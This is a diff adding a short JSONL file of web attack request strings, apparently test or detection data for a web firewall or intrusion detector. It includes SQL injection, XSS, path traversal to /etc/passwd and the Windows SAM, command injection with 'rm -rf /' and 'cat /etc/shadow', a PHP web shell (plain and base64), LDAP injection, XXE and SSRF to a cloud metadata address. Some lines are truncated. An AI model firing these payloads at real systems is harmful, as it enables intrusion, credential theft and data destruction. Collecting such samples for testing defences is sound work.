@@ -1,0 +1,19 @@
+{"request": "GET /login id=' OR '1'='1"}
+{"request": "GET /login id=1' UNION SELECT * FROM users--"}
+{"request": "GET /search q='; DROP TABLE users;--"}
+{"request": "POST /login {\"username\": \"admin\", \"password\": \"pass' OR '1'='1"}
+{"request": "GET /search q=<script>alert('XSS')</script>"}
+{"request": "GET /comment msg=<img src=x onerror=alert(1)>"}
+{"request": "POST /post {\"content\": \"<script>document.location=\\\"http://ev"}
+{"request": "GET /file name=../../../etc/passwd"}
+{"request": "GET /download file=..\\..\\..\\windows\\system32\\config\\sam"}
+{"request": "GET /include page=....//....//....//etc/passwd"}
+{"request": "GET /ping host=127.0.0.1; cat /etc/passwd"}
+{"request": "GET /system cmd=ls -la && rm -rf /"}
+{"request": "POST /exec {\"command\": \"whoami && cat /etc/shadow\"}"}
+{"request": "POST /eval {\"code\": \"<?php system($_GET['cmd']); ?>\"}"}
+{"request": "GET /include file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"}
+{"request": "GET /auth user=admin)(&(password=*))"}
+{"request": "POST /xml <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test"}
+{"request": "GET /fetch url=http://169.254.169.254/latest/meta-data/"}
+{"request": "GET /proxy target=file:///etc/passwd"}
